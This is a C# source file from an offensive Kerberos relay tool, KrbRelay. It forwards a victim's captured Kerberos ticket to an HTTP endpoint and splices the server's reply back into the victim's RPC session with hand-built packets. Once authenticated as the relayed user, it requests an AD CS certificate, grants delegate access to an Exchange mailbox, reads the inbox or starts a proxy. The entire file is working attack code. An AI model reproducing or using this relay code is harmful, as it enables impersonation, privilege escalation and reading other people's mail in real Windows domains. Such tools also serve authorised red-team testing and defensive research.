using Org.BouncyCastle.X509;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using static KrbRelay.Program;
using static System.Net.WebRequestMethods;
namespace KrbRelay.Clients
{
    public class Http
    {
        public static void Connect()
        {
            string endpoint = "";
            if (!string.IsNullOrEmpty(attacks["endpoint"]))
            {
                endpoint = attacks["endpoint"].TrimStart('/');
            }

            HttpResponseMessage result;
            byte[] b = new byte[2];
            int fraglen, authlen;

            Array.Copy(Program.apreqBuffer, 8, b, 0, 2);


            fraglen = BitConverter.ToInt16(b, 0);
            Array.Copy(Program.apreqBuffer, 10, b, 0, 2);
            authlen = BitConverter.ToInt16(b, 0);

            byte[] destinationArray = new byte[authlen]; // Subtract 3 for skipping the first 3 bytes

            Array.Copy(Program.apreqBuffer, fraglen - authlen, destinationArray, 0, authlen);

            ticket = Program.apreqBuffer;

            var cookie = string.Format("Negotiate {0}", Convert.ToBase64String(ticket));

            using (var message = new HttpRequestMessage(HttpMethod.Get, endpoint))
            {
                message.Headers.Add("Authorization", cookie);
                message.Headers.Add("Connection", "keep-alive");
                message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
                result = httpClient.SendAsync(message).Result;
            }
            Console.WriteLine("[*] HTTP Status Code:{0}", result.StatusCode);
            Console.WriteLine("[*] HTTP Headers\r\n---");
            Console.WriteLine(result.Headers);
            Console.WriteLine("---");


            if (result.StatusCode != HttpStatusCode.Unauthorized)
            {
                Console.WriteLine("[+] HTTP session established");

                //Kerberos auth may not require set-cookies
                IEnumerable<string> cookies = null;
                foreach (var h in result.Headers)
                {
                    if (h.Key == "Set-Cookie")
                    {
                        cookies = h.Value;
                        //Console.WriteLine("[*] Authentication Cookie:\n" + string.Join(";", h.Value));
                    }
                }

                try
                {
                    if (attacks.Keys.Contains("proxy"))
                    {
                        Attacks.Http.ProxyServer.Start(httpClient, httpClient.BaseAddress.ToString());
                    }

                    if (attacks.Keys.Contains("adcs"))
                    {
                        //Console.WriteLine("Relayed user:{0}{1}", relayedUser, relayedUserDomain);
                        Attacks.Http.ADCS.requestCertificate(httpClient, relayedUser, relayedUserDomain, attacks["adcs"]);
                    }

                    if (attacks.Keys.Contains("ews-delegate"))
                    {
                        Attacks.Http.EWS.delegateMailbox(httpClient, relayedUser, attacks["ews-delegate"]);
                    }

                    if (attacks.Keys.Contains("ews-search"))
                    {
                        Attacks.Http.EWS.readMailbox(httpClient, "inbox", attacks["ews-search"]);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                return;
            }
            else
            {
                foreach (var header in result.Headers)
                {


                    if (header.Key == "WWW-Authenticate")
                    {
                        
                        string headerValue = header.Value.First().Replace("Negotiate ", "").Trim();

                        if (headerValue.Length < 1)
                        {
                            Console.WriteLine("[-] No WWW-Authenticate header returned, status code: {0}", result.StatusCode);
                            return;
                        }

                        else
                        {


                            apRep1 = Convert.FromBase64String(headerValue);


                            byte[] moreArray = new byte[] { 0x05, 0x00, 0x0C, 0x07, 0x10, 0x00, 0x00, 0x00, 0xEE, 0x00, 0xAA, 0x00, 0x03, 0x00, 0x00, 0x00, 0xD0, 0x16, 0xD0, 0x16, 0xF6, 0x15, 0x00, 0x00, 0x04, 0x00, 0x31, 0x33, 0x35, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00 };
                            byte[] buffer = new byte[4096];
                            int outlen = apRep1.Length + moreArray.Length + 8;

                            byte[] head = new byte[] { 0x09, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                            byte[] outbuffer = new byte[outlen];
                            byte[] b1 = BitConverter.GetBytes(outlen);


                            Array.Copy(moreArray, 0, outbuffer, 0, moreArray.Length);

                            Array.Copy(head, 0, outbuffer, moreArray.Length, 8);

                            Array.Copy(apRep1, 0, outbuffer, moreArray.Length + 8, apRep1.Length);

                            Array.Copy(b1, 0, outbuffer, 8, 2);

                            b1 = BitConverter.GetBytes(apRep1.Length);
                            Array.Copy(b1, 0, outbuffer, 10, 2);
                            outbuffer[12] = Program.CallID[0];

                            Array.Copy(Program.AssocGroup, 0, outbuffer, 20, 4);
                            Program.currSourceSocket.Send(outbuffer);
                            


                            
                            int l = Program.currSourceSocket.Receive(buffer);
                            

                            int pattern = KrbRelay.Helpers.PatternAt(buffer, new byte[] { 0xa1, 0x81 });
                            int l3 = l - pattern;
                            byte[] sendbuffer = new byte[l3];
                            Array.Copy(buffer, pattern, sendbuffer, 0, l3);
                            ticket = sendbuffer;
                            cookie = string.Format("Negotiate {0}", Convert.ToBase64String(ticket));

                            using (var message = new HttpRequestMessage(HttpMethod.Get, endpoint))
                            {
                                message.Headers.Add("Authorization", cookie);
                                message.Headers.Add("Connection", "keep-alive");
                                message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
                                //Console.WriteLine("sending");
                                result = httpClient.SendAsync(message).Result;
                            }
                            Program.forwdardmode = true;
                            currSocketServer.state.isRelayed = false;

                            currSocketServer.CloseConnection(currSocketServer.state);

                            IEnumerable<string> cookies = null;
                            foreach (var h in result.Headers)
                            {
                                if (h.Key == "Set-Cookie")
                                {
                                    cookies = h.Value;
                                    Console.WriteLine("[*] Authentication Cookie;\n" + string.Join(";", h.Value));
                                }
                            }

                            try
                            {
                                if (attacks.Keys.Contains("proxy"))
                                {
                                    Attacks.Http.ProxyServer.Start(httpClient, httpClient.BaseAddress.ToString());
                                }

                                if (attacks.Keys.Contains("adcs"))
                                {
                                    //Console.WriteLine("Relayed user:{0}{1}", relayedUser, relayedUserDomain);
                                    Attacks.Http.ADCS.requestCertificate(httpClient, relayedUser, relayedUserDomain, attacks["adcs"]);
                                }

                                if (attacks.Keys.Contains("ews-delegate"))
                                {
                                    Attacks.Http.EWS.delegateMailbox(httpClient, relayedUser, attacks["ews-delegate"]);
                                }

                                if (attacks.Keys.Contains("ews-search"))
                                {
                                    Attacks.Http.EWS.readMailbox(httpClient, "inbox", attacks["ews-search"]);
                                }
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[-] {0}", e);
                            }

                          
                            
                            return;
                        }



                    
                        return;
                    }
                }
            }
        }
    } 
}
     
    